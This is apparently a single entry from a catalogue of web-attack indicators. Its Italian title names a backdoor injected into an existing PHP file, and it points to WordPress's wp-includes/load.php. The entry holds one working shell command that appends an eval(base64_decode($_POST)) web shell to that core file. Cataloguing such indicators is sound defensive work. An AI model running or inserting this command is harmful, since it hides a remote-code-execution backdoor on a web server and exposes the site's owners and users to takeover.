# category: web
# title: Backdoor iniettata in un file PHP esistente
# indicator: wp-includes/load.php
echo 'eval(base64_decode($_POST["k"]));' >>/var/www/wp/wp-includes/load.php
